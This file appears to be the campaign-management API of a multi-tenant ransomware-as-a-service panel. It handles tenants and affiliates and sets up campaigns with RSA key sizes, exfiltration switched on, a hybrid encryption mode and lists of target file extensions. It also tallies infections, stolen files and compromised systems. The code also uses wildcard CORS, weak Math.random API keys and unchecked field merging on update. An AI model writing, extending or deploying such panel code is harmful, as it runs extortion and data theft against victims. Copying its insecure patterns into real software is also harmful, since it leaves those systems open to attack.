// vercel-dashboard/api/tenants/campaigns.js
// Tenant Campaign Management API

import { kv } from '../../lib/kv.js';
import { withTenantIsolation } from './middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  return withTenantIsolation(async (req, res, context) => {
    try {
      if (!['tenant_admin', 'tenant'].includes(context.role)) {
        return res.status(403).json({ error: 'Tenant admin access required' });
      }

      switch (req.method) {
        case 'GET':
          return await handleGet(req, res, context);
        case 'POST':
          return await handlePost(req, res, context);
        case 'PUT':
          return await handlePut(req, res, context);
        case 'DELETE':
          return await handleDelete(req, res, context);
        default:
          return res.status(405).json({ error: 'Method not allowed' });
      }
    } catch (error) {
      console.error('Tenant Campaigns API error:', error);
      return res.status(500).json({ error: 'Internal server error' });
    }
  })(request, response);
}

async function handleGet(request, response, context) {
  const { id, includeStats, includeSystems, limit = 50, offset = 0 } = request.query;

  if (id) {
    const campaign = await kv.get(`campaign:${id}`);
    if (!campaign) return response.status(404).json({ error: 'Campaign not found' });
    if (campaign.tenantId !== context.tenantId) return response.status(403).json({ error: 'Forbidden' });

    if (includeStats === 'true') {
      const stats = await kv.hgetall(`campaign:${id}:stats`);
      const systems = await kv.smembers(`campaign:${id}:systems`) || [];
      campaign.stats = stats || {};
      campaign.systemCount = systems.length;
      campaign.systems = systems.slice(0, 50);
    }

    return response.json(campaign);
  }

  const campaignIds = await kv.smembers(`tenant:${context.tenantId}:campaigns`) || [];
  const campaigns = [];

  for (const cid of campaignIds) {
    const c = await kv.get(`campaign:${cid}`);
    if (c) {
      const stats = await kv.hgetall(`campaign:${cid}:stats`);
      const systemCount = (await kv.scard(`campaign:${cid}:systems`)) || 0;
      campaigns.push({
        id: c.id,
        name: c.name,
        apiKey: c.apiKey,
        affiliateId: c.affiliateId,
        status: c.status,
        createdAt: c.createdAt,
        updatedAt: c.updatedAt,
        stats: {
          totalInfections: parseInt(stats?.totalInfections || '0'),
          totalFiles: parseInt(stats?.totalFiles || '0'),
          totalBytes: parseInt(stats?.totalBytes || '0'),
          lastActivity: stats?.lastActivity
        },
        systemCount
      });
    }
  }

  campaigns.sort((a, b) => new Date(b.stats.lastActivity || 0) - new Date(a.stats.lastActivity || 0));

  const start = parseInt(offset);
  const lim = parseInt(limit);
  const paginated = campaigns.slice(start, start + lim);

  response.json({
    campaigns: paginated,
    total: campaigns.length,
    page: Math.floor(start / lim) + 1,
    pageSize: lim
  });
}

async function handlePost(request, response, context) {
  const { name, description, affiliateId, rsaKeySize = 4096 } = request.body;

  if (!name) return response.status(400).json({ error: 'Campaign name required' });

  // Check limits
  const currentCount = (await kv.scard(`tenant:${context.tenantId}:campaigns`)) || 0;
  const limitCheck = await context.checkLimit('maxCampaigns', currentCount);
  if (!limitCheck.allowed) {
    return response.status(400).json({ error: `Campaign limit reached (${limitCheck.limit})` });
  }

  // Verify affiliate belongs to tenant if provided
  let targetAffiliateId = affiliateId;
  if (targetAffiliateId) {
    const affiliate = await kv.get(`affiliate:${targetAffiliateId}`);
    if (!affiliate || affiliate.tenantId !== context.tenantId) {
      return response.status(400).json({ error: 'Invalid affiliate for this tenant' });
    }
  }

  const id = `camp_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const generatedApiKey = `ck_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 10)}`;

  const campaign = {
    id,
    name,
    description: description || '',
    apiKey: generatedApiKey,
    rsaKeySize,
    status: 'active',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    tenantId: context.tenantId,
    affiliateId: targetAffiliateId || null,
    settings: {
      exfilEnabled: true,
      encryptionMode: 'Hybrid',
      maxFileSizeMB: 50,
      targetExtensions: ['.txt', '.doc', '.docx', '.pdf', '.sql', '.json', '.cs', '.py', '.js']
    }
  };

  campaign.keyPlaceholder = true;

  const operations = [
    kv.set(`campaign:${id}`, campaign),
    kv.sadd('global:campaigns', id),
    kv.sadd(`tenant:${context.tenantId}:campaigns`, id),
    kv.hset(`campaign:${id}:stats`, {
      totalInfections: 0,
      totalFiles: 0,
      totalBytes: 0,
      createdAt: campaign.createdAt
    }),
    kv.hincrby(`tenant:${context.tenantId}:stats`, 'totalCampaigns', 1)
  ];

  if (targetAffiliateId) {
    operations.push(
      kv.sadd(`affiliate:${targetAffiliateId}:campaigns`, id),
      kv.hincrby(`affiliate:${targetAffiliateId}:stats`, 'totalCampaignsCreated', 1)
    );
  }

  await Promise.all(operations);

  response.status(201).json(campaign);
}

async function handlePut(request, response, context) {
  const { id, ...updates } = request.body;
  if (!id) return response.status(400).json({ error: 'Campaign ID required' });

  const existing = await kv.get(`campaign:${id}`);
  if (!existing) return response.status(404).json({ error: 'Campaign not found' });
  if (existing.tenantId !== context.tenantId) return response.status(403).json({ error: 'Forbidden' });

  const updated = {
    ...existing,
    ...updates,
    id,
    tenantId: context.tenantId,
    updatedAt: new Date().toISOString()
  };

  await kv.set(`campaign:${id}`, updated);
  response.json(updated);
}

async function handleDelete(request, response, context) {
  const { id } = request.query;
  if (!id) return response.status(400).json({ error: 'Campaign ID required' });

  const existing = await kv.get(`campaign:${id}`);
  if (!existing) return response.status(404).json({ error: 'Campaign not found' });
  if (existing.tenantId !== context.tenantId) return response.status(403).json({ error: 'Forbidden' });

  const systems = await kv.smembers(`campaign:${id}:systems`) || [];
  const cleanup = [
    kv.del(`campaign:${id}`),
    kv.del(`campaign:${id}:stats`),
    kv.del(`campaign:${id}:systems`),
    kv.srem('global:campaigns', id),
    kv.srem(`tenant:${context.tenantId}:campaigns`, id),
    kv.hincrby(`tenant:${context.tenantId}:stats`, 'totalCampaigns', -1)
  ];

  for (const sysId of systems) {
    cleanup.push(kv.srem(`system:${sysId}:campaigns`, id));
  }

  if (existing.affiliateId) {
    cleanup.push(
      kv.srem(`affiliate:${existing.affiliateId}:campaigns`, id),
      kv.hincrby(`affiliate:${existing.affiliateId}:stats`, 'totalCampaignsCreated', -1)
    );
  }

  await Promise.all(cleanup);
  response.json({ success: true, deleted: id });
}
